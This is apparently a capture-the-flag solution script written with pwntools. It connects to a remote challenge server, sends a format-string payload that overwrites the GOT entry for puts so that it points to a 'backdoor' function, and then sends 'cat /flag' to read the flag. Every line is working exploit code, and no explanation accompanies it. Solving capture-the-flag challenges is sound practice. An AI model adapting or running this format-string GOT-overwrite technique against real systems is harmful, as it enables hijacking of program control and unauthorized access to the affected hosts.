from pwn import *

f = ELF('chars')

r = remote('129.204.78.34', 20787)
r.sendline(b'1')

sleep(1)

payload = fmtstr_payload(6, {
    f.got['puts']: f.symbols['backdoor'],
})

r.sendline(payload)
r.sendline(b'cat /flag')

print(r.recvline_contains(b'HNUCTF'))
